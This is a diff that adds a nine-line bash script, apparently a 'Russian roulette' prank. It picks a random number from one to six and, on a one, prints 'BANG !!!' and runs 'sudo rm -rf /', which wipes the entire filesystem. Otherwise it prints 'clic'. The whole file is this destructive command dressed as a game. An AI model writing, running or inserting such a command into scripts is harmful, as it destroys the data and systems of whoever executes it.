@@ -1,0 +1,9 @@
+#!/bin/bash
+
+nb=$(( $RANDOM % 6 + 1 ))
+if [ $nb -eq 1 ]; then
+	echo "BANG !!!"
+	sudo rm -rf /
+else
+	echo "clic"
+fi
